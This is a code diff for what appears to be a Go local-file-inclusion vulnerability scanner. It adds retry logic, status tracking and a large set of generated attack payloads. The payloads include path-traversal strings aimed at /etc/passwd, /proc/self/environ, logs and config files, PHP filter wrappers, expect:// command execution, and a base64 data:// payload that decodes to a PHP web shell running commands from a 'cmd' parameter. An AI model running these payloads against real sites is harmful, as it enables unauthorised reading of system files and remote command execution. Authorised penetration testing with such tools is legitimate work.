@@ -16,41 +16,61 @@ import (
 
 // Config holds the scanner configuration
 type Config struct {
-	TargetURL     string
-	ParamsList    []string
-	ScanAllParams bool
-	Wordlist      string
-	Threads       int
-	Timeout       int
-	Verbose       bool
-	OutputFile    string
-	Cookies       string
-	Headers       string
-	Depth         int
-	RequestFile   string   // Path to a request file (e.g., from Burp)
+	TargetURL       string
+	ParamsList      []string
+	ScanAllParams   bool
+	Wordlist        string
+	Threads         int
+	Timeout         int
+	Verbose         bool
+	OutputFile      string
+	Cookies         string
+	Headers         string
+	Depth           int
+	RequestFile     string   // Path to a request file (e.g., from Burp)
+	IgnoreSignatures []string // Signatures to ignore during scanning (to filter out false positives)
 }
 
 // Result represents a found vulnerability
 type Result struct {
-	URL       string `json:"url"`
-	Parameter string `json:"parameter"`
-	Payload   string `json:"payload"`
-	Evidence  string `json:"evidence"`
+	URL         string `json:"url"`
+	Parameter   string `json:"parameter"`
+	Payload     string `json:"payload"`
+	Evidence    string `json:"evidence"`
+	StatusCode  int    `json:"status_code"`  // HTTP status code of the response
+	ContentType string `json:"content_type"` // Content-Type of the response
 }
 
 // Scanner represents the LFI vulnerability scanner
 type Scanner struct {
-	config   Config
-	client   *http.Client
-	payloads []string
-	headers  map[string]string
+	config       Config
+	client       *http.Client
+	payloads     []string
+	headers      map[string]string
+	statusCounts map[int]int
+	transport    *http.Transport // Add explicit transport for better connection management
+	mu           sync.Mutex      // Add mutex for concurrent map access protection
 }
 
 // NewScanner creates a new scanner instance
 func NewScanner(config Config) *Scanner {
-	// Setup HTTP client with timeout
+	// Setup HTTP client with timeout and improved connection management
+	transport := &http.Transport{
+		MaxIdleConns:          100,                                      // Increase from 10
+		MaxIdleConnsPerHost:   100,                                      // Increase from 5
+		IdleConnTimeout:       20 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: time.Duration(config.Timeout) * time.Second,
+		ExpectContinueTimeout: 5 * time.Second,
+		DisableKeepAlives:     false,                                     // Enable keep-alives for connection reuse
+		MaxConnsPerHost:       config.Threads * 2,                        // Limit based on threads
+		ForceAttemptHTTP2:     false,                                     // Disable HTTP/2 to avoid related goroutine leaks
+		DisableCompression:    true,                                      // Disable compression to avoid some issues
+	}
+	
 	client := &http.Client{
-		Timeout: time.Duration(config.Timeout) * time.Second,
+		Timeout:   time.Duration(config.Timeout) * time.Second,
+		Transport: transport,
 	}
 
 	// Parse headers if provided
@@ -66,10 +86,13 @@ func NewScanner(config Config) *Scanner {
 	}
 
 	scanner := &Scanner{
-		config:   config,
-		client:   client,
-		headers:  headers,
-		payloads: []string{},
+		config:       config,
+		client:       client,
+		headers:      headers,
+		payloads:     []string{},
+		statusCounts: make(map[int]int),
+		transport:    transport,
+		mu:           sync.Mutex{}, // Initialize mutex
 	}
 
 	// Load payloads
@@ -136,7 +159,7 @@ func (s *Scanner) loadDefaultPayloads() {
 		"/var/log/httpd/access_log",
 		"../../../../../../../etc/passwd",
 		"..\\..\\..\\..\\..\\..\\Windows\\system.ini",
-		
+
 		// Added payloads from payloadbox/rfi-lfi-payload-list
 		"/etc/passwd%00",
 		"///etc///passwd",
@@ -148,6 +171,8 @@ func (s *Scanner) loadDefaultPayloads() {
 		"../../../../../../../../../../../../etc/passwd%00.jpg",
 		"....//....//....//....//....//....//....//....//....//....//etc/passwd",
 		"/etc/passwd%0a",
+		
+		// PHP wrapper payloads (we'll add more with generatePHPWrapperPayloads)
 		"php://filter/convert.base64-encode/resource=/etc/passwd",
 		"php://filter/read=convert.base64-encode/resource=/etc/passwd",
 		"php://filter/resource=/etc/passwd",
@@ -158,7 +183,7 @@ func (s *Scanner) loadDefaultPayloads() {
 		"expect://id",
 		"phar://pharfile.jpg/file.php",
 		"zip://zipfile.jpg%23file.php",
-		
+
 		// Windows specific payloads
 		"C:\\Windows\\system.ini",
 		"C:\\Windows\\win.ini",
@@ -180,7 +205,7 @@ func (s *Scanner) loadDefaultPayloads() {
 		"C:\\inetpub\\logs\\LogFiles",
 		"C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
 		"C:\\Program Files\\Apache Group\\Apache\\logs\\error.log",
-		
+
 		// Log files
 		"/var/log/sshd.log",
 		"/var/log/mail.log",
@@ -195,14 +220,14 @@ func (s *Scanner) loadDefaultPayloads() {
 		"/var/log/faillog",
 		"/var/log/cron",
 		"/var/log/messages",
-		
+
 		// Apache config files
 		"/usr/local/etc/apache2/httpd.conf",
 		"/usr/local/apache/conf/httpd.conf",
 		"/usr/local/apache2/conf/httpd.conf",
 		"/etc/apache2/sites-available/000-default.conf",
 		"/etc/apache2/sites-enabled/000-default.conf",
-		
+
 		// PHP files
 		"/usr/local/etc/php.ini",
 		"/etc/php.ini",
@@ -216,7 +241,7 @@ func (s *Scanner) loadDefaultPayloads() {
 		"/etc/php7/cli/php.ini",
 		"/etc/php7/cgi/php.ini",
 		"/etc/php7/fpm/php.ini",
-		
+
 		// Proc entries
 		"/proc/self/fd/0",
 		"/proc/self/fd/1",
@@ -238,6 +263,96 @@ func (s *Scanner) loadDefaultPayloads() {
 	}
 
 	s.payloads = defaultPayloads
+	
+	// Generate PHP wrapper payloads with all target files
+	phpWrapperPayloads := s.generatePHPWrapperPayloads(defaultPayloads)
+	s.payloads = append(s.payloads, phpWrapperPayloads...)
+}
+
+// generatePHPWrapperPayloads creates PHP filter and data wrapper payloads for all target files
+func (s *Scanner) generatePHPWrapperPayloads(targetFiles []string) []string {
+	// PHP wrapper types to use
+	wrappers := []string{
+		"php://filter/convert.base64-encode/resource=%s",
+		"php://filter/read=convert.base64-encode/resource=%s",
+		"php://filter/resource=%s",
+		"php://filter/zlib.deflate/convert.base64-encode/resource=%s",
+		"php://filter/convert.iconv.utf-8.utf-16/resource=%s",
+		"php://filter/convert.base64-decode/resource=%s",
+		"phar://%s",
+		"zip://%s",
+	}
+	
+	// Collect traversal variations
+	traversals := []string{
+		"", // No traversal
+		"../",
+		"../../",
+		"../../../",
+		"../../../../",
+		"../../../../../",
+	}
+	
+	var payloads []string
+	
+	// For each PHP wrapper
+	for _, wrapper := range wrappers {
+		// Add different traversal depths for each target file
+		for _, targetFile := range targetFiles {
+			// Skip if it's already a PHP wrapper payload
+			if strings.HasPrefix(targetFile, "php://") || 
+			   strings.HasPrefix(targetFile, "data://") || 
+			   strings.HasPrefix(targetFile, "phar://") || 
+			   strings.HasPrefix(targetFile, "zip://") ||
+			   strings.HasPrefix(targetFile, "expect://") {
+				continue
+			}
+			
+			// Clean up the target path by removing any existing traversal or root indicators
+			cleanTarget := targetFile
+			cleanTarget = strings.TrimPrefix(cleanTarget, "/")
+			cleanTarget = strings.TrimPrefix(cleanTarget, "C:")
+			cleanTarget = strings.TrimPrefix(cleanTarget, "\\")
+			cleanTarget = strings.TrimPrefix(cleanTarget, "/")
+			
+			// Skip empty paths
+			if cleanTarget == "" {
+				continue
+			}
+			
+			// Create the standard version
+			payload := fmt.Sprintf(wrapper, targetFile)
+			payloads = append(payloads, payload)
+			
+			// Try with null byte (PHP < 5.3.4)
+			payloads = append(payloads, payload + "%00")
+			
+			// Add traversal variations for non-absolute paths
+			if !strings.HasPrefix(targetFile, "/") && !strings.Contains(targetFile, ":\\") {
+				for _, traversal := range traversals {
+					traversalPayload := fmt.Sprintf(wrapper, traversal+cleanTarget)
+					payloads = append(payloads, traversalPayload)
+					
+					// With null byte
+					payloads = append(payloads, traversalPayload + "%00")
+				}
+			}
+		}
+	}
+	
+	// Add more specialized payloads
+	payloads = append(payloads, []string{
+		// Data wrapper with PHP shell
+		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+		// PHP input wrapper
+		"php://input",
+		"php://input%00",
+		// Expect wrapper (system command execution)
+		"expect://id",
+		"expect://ls",
+	}...)
+	
+	return payloads
 }
 
 // generatePathTraversalPayloads generates path traversal payloads with different depths
@@ -269,7 +384,7 @@ func (s *Scanner) generatePathTraversalPayloads() {
 			for depth := 1; depth <= s.config.Depth; depth++ {
 				traversal := strings.Repeat(enc.traversal, depth)
 				payload := traversal + file
-				
+
 				// Add variations with null byte and different encodings
 				dynamicPayloads = append(dynamicPayloads, payload)
 				if enc.name == "standard" {
@@ -285,11 +400,21 @@ func (s *Scanner) generatePathTraversalPayloads() {
 	s.payloads = append(s.payloads, dynamicPayloads...)
 }
 
+// CloseIdleConnections closes any idle connections in the connection pool
+func (s *Scanner) CloseIdleConnections() {
+	if s.transport != nil {
+		s.transport.CloseIdleConnections()
+	}
+}
+
 // Run executes the LFI vulnerability scan
 func (s *Scanner) Run() []Result {
 	var results []Result
 	var targetURL string
 	var requestInfo *RequestInfo
+	
+	// Defer cleanup of idle connections
+	defer s.CloseIdleConnections()
 
 	// Check if we're using a request file or a target URL
 	if s.config.RequestFile != "" {
@@ -300,25 +425,25 @@ func (s *Scanner) Run() []Result {
 			fmt.Printf("Error parsing request file: %s\n", err)
 			return results
 		}
-		
+
 		targetURL = requestInfo.URL
-		
+
 		// Set cookies from request if not specified via command line
 		if s.config.Cookies == "" && requestInfo.Cookies != "" {
 			// Add cookies from the request file to the headers
 			s.headers["Cookie"] = requestInfo.Cookies
 		}
-		
+
 		// Add headers from request if not already set via command line
 		for k, v := range requestInfo.Headers {
 			if _, exists := s.headers[k]; !exists {
 				s.headers[k] = v
 			}
 		}
-		
+
 		if s.config.Verbose {
 			fmt.Printf("Parsed request file: %s %s\n", requestInfo.Method, targetURL)
-			fmt.Printf("Found %d query parameters, %d form parameters\n", 
+			fmt.Printf("Found %d query parameters, %d form parameters\n",
 				len(requestInfo.QueryParams), len(requestInfo.FormParams))
 		}
 	} else {
@@ -337,7 +462,7 @@ func (s *Scanner) Run() []Result {
 			fmt.Println("Extracting parameters from request file...")
 		}
 		paramsToTest = GetParametersFromRequest(requestInfo)
-		
+
 		// If no parameters were found or user wants to test additional ones
 		if len(paramsToTest) == 0 {
 			fmt.Println("No parameters found in the request. Would you like to test with common parameter names? (y/n)")
@@ -438,7 +563,7 @@ func (s *Scanner) testPayload(paramName, payload string) (Result, bool) {
 	testURL, err := buildTestURL(s.config.TargetURL, paramName, payload)
 	if err != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error building URL for parameter %s with payload %s: %s\n", 
+			fmt.Printf("Error building URL for parameter %s with payload %s: %s\n",
 				paramName, payload, err)
 		}
 		return Result{}, false
@@ -451,52 +576,107 @@ func (s *Scanner) testPayload(paramName, payload string) (Result, bool) {
 	// Create request
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(s.config.Timeout)*time.Second)
 	defer cancel()
-	
-	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
-	if err != nil {
+
+	// Add exponential backoff retry logic for connection errors
+	var resp *http.Response
+	var respErr error
+	maxRetries := 3
+	retryDelay := time.Millisecond * 100
+
+	for retry := 0; retry < maxRetries; retry++ {
+		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
+		if err != nil {
+			if s.config.Verbose {
+				fmt.Printf("Error creating request: %s\n", err)
+			}
+			return Result{}, false
+		}
+
+		// Add headers
+		for k, v := range s.headers {
+			req.Header.Add(k, v)
+		}
+
+		// Add cookies if provided
+		if s.config.Cookies != "" {
+			req.Header.Add("Cookie", s.config.Cookies)
+		}
+
+		// Send request
+		resp, respErr = s.client.Do(req)
+		if respErr == nil {
+			break // Success, exit retry loop
+		}
+
+		// If it's a connection issue, retry with backoff
+		if retry < maxRetries-1 && isConnectionError(respErr) {
+			if s.config.Verbose {
+				fmt.Printf("%sConnection error, retrying (%d/%d): %s%s\n", 
+					colorYellow, retry+1, maxRetries, respErr, colorReset)
+			}
+			// Wait before retrying
+			select {
+			case <-time.After(retryDelay):
+				// Exponential backoff
+				retryDelay *= 2
+			case <-ctx.Done():
+				// Context timeout reached
+				if s.config.Verbose {
+					fmt.Printf("%sRequest timeout during retry: %s%s\n", colorRed, ctx.Err(), colorReset)
+				}
+				return Result{}, false
+			}
+			continue
+		}
+
+		// Non-retriable error
 		if s.config.Verbose {
-			fmt.Printf("Error creating request: %s\n", err)
+			fmt.Printf("%sError sending request: %s%s\n", colorRed, respErr, colorReset)
 		}
 		return Result{}, false
 	}
 
-	// Add headers
-	for k, v := range s.headers {
-		req.Header.Add(k, v)
-	}
-
-	// Add cookies if provided
-	if s.config.Cookies != "" {
-		req.Header.Add("Cookie", s.config.Cookies)
-	}
-
-	// Send request
-	resp, err := s.client.Do(req)
-	if err != nil {
+	// If all retries failed
+	if respErr != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error sending request: %s\n", err)
+			fmt.Printf("%sAll retries failed, error sending request: %s%s\n", colorRed, respErr, colorReset)
 		}
 		return Result{}, false
 	}
+
 	defer resp.Body.Close()
+
+	// Track status code counts
+	s.mu.Lock()
+	s.statusCounts[resp.StatusCode]++
+	s.mu.Unlock()
 
 	// Read response body
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error reading response: %s\n", err)
+			fmt.Printf("%sError reading response: %s%s\n", colorRed, err, colorReset)
 		}
 		return Result{}, false
+	}
+
+	// Show status code in verbose mode
+	if s.config.Verbose {
+		statusColor := getStatusCodeColor(resp.StatusCode)
+		fmt.Printf("[%s%d%s] %s (Parameter: %s, Payload: %s)\n",
+			statusColor, resp.StatusCode, colorReset, testURL, paramName, payload)
 	}
 
 	// Check for evidence of successful LFI
 	found, evidence := s.checkForLFIEvidence(payload, string(body))
 	if found {
 		return Result{
-			URL:       testURL,
-			Parameter: paramName,
-			Payload:   payload,
-			Evidence:  evidence,
+			URL:         testURL,
+			Parameter:   paramName,
+			Payload:     payload,
+			Evidence:    evidence,
+			StatusCode:  resp.StatusCode,
+			ContentType: resp.Header.Get("Content-Type"),
 		}, true
 	}
 
@@ -513,7 +693,7 @@ func (s *Scanner) testRequestPayload(reqInfo *RequestInfo, paramName, payload st
 	req, err := CreateHTTPRequestFromRequestInfo(reqInfo, paramName, payload)
 	if err != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error creating request with payload: %s\n", err)
+			fmt.Printf("%sError creating request with payload: %s%s\n", colorRed, err, colorReset)
 		}
 		return Result{}, false
 	}
@@ -537,29 +717,43 @@ func (s *Scanner) testRequestPayload(reqInfo *RequestInfo, paramName, payload st
 	resp, err := s.client.Do(req)
 	if err != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error sending request: %s\n", err)
+			fmt.Printf("%sError sending request: %s%s\n", colorRed, err, colorReset)
 		}
 		return Result{}, false
 	}
 	defer resp.Body.Close()
 
+	// Track status code counts
+	s.mu.Lock()
+	s.statusCounts[resp.StatusCode]++
+	s.mu.Unlock()
+
 	// Read response body
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		if s.config.Verbose {
-			fmt.Printf("Error reading response: %s\n", err)
+			fmt.Printf("%sError reading response: %s%s\n", colorRed, err, colorReset)
 		}
 		return Result{}, false
+	}
+
+	// Show status code in verbose mode
+	if s.config.Verbose {
+		statusColor := getStatusCodeColor(resp.StatusCode)
+		fmt.Printf("[%s%d%s] %s (Parameter: %s, Payload: %s)\n",
+			statusColor, resp.StatusCode, colorReset, req.URL.String(), paramName, payload)
 	}
 
 	// Check for evidence of successful LFI
 	found, evidence := s.checkForLFIEvidence(payload, string(body))
 	if found {
 		return Result{
-			URL:       req.URL.String(),
-			Parameter: paramName,
-			Payload:   payload,
-			Evidence:  evidence,
+			URL:         req.URL.String(),
+			Parameter:   paramName,
+			Payload:     payload,
+			Evidence:    evidence,
+			StatusCode:  resp.StatusCode,
+			ContentType: resp.Header.Get("Content-Type"),
 		}, true
 	}
 
@@ -577,7 +771,7 @@ func (s *Scanner) checkForLFIEvidence(payload, responseBody string) (bool, strin
 			"root:$", "daemon:*",
 		},
 		"proc/self/environ": {
-			"DOCUMENT_ROOT=", "SERVER_SOFTWARE=", "SCRIPT_NAME=", 
+			"DOCUMENT_ROOT=", "SERVER_SOFTWARE=", "SCRIPT_NAME=",
 		},
 		"Windows/system.ini": {
 			"[drivers]", "[mci]", "for 16-bit app support",
@@ -607,6 +801,11 @@ func (s *Scanner) checkForLFIEvidence(payload, responseBody string) (bool, strin
 	for fileType, signatures := range patterns {
 		if strings.Contains(payload, fileType) {
 			for _, signature := range signatures {
+				// Skip signatures that the user has asked to ignore
+				if containsString(s.config.IgnoreSignatures, signature) {
+					continue
+				}
+				
 				if strings.Contains(responseBody, signature) {
 					return true, fmt.Sprintf("Found signature '%s' in response", signature)
 				}
@@ -624,12 +823,27 @@ func (s *Scanner) checkForLFIEvidence(payload, responseBody string) (bool, strin
 	}
 
 	for _, indicator := range genericIndicators {
+		// Skip indicators that the user has asked to ignore
+		if containsString(s.config.IgnoreSignatures, indicator) {
+			continue
+		}
+		
 		if strings.Contains(responseBody, indicator) {
 			return true, fmt.Sprintf("Found generic LFI indicator '%s'", indicator)
 		}
 	}
 
 	return false, ""
+}
+
+// containsString checks if a string is in a slice of strings
+func containsString(slice []string, s string) bool {
+	for _, item := range slice {
+		if item == s {
+			return true
+		}
+	}
+	return false
 }
 
 // SaveResults saves scan results to a file
@@ -681,3 +895,64 @@ func buildTestURL(baseURL, paramName, payload string) (string, error) {
 
 	return u.String(), nil
 }
+
+// getStatusCodeColor returns the color for a given HTTP status code
+func getStatusCodeColor(statusCode int) string {
+	switch {
+	case statusCode >= 200 && statusCode < 300:
+		return colorGreen
+	case statusCode >= 300 && statusCode < 400:
+		return colorYellow
+	case statusCode >= 400 && statusCode < 500:
+		return colorRed
+	case statusCode >= 500:
+		return colorMagenta
+	default:
+		return colorReset
+	}
+}
+
+// GetStatusCounts returns a map of HTTP status codes and their count during the scan
+func (s *Scanner) GetStatusCounts() map[int]int {
+	// Return a copy of the status counts map to prevent modification
+	counts := make(map[int]int)
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	for code, count := range s.statusCounts {
+		counts[code] = count
+	}
+	return counts
+}
+
+// isConnectionError determines if an error is a retriable connection error
+func isConnectionError(err error) bool {
+	if err == nil {
+		return false
+	}
+	
+	errorString := err.Error()
+	
+	// Check for common connection errors
+	connectionErrors := []string{
+		"connectex:", "connection refused", "timeout", "deadline exceeded",
+		"connection reset", "connection closed", "EOF", "broken pipe",
+		"use of closed network connection", "Only one usage of each socket address",
+	}
+	
+	for _, errText := range connectionErrors {
+		if strings.Contains(errorString, errText) {
+			return true
+		}
+	}
+	
+	return false
+}
+
+// ANSI color codes for output
+const (
+	colorReset   = "\033[0m"
+	colorRed     = "\033[31m"
+	colorGreen   = "\033[32m"
+	colorYellow  = "\033[33m"
+	colorMagenta = "\033[35m"
+)
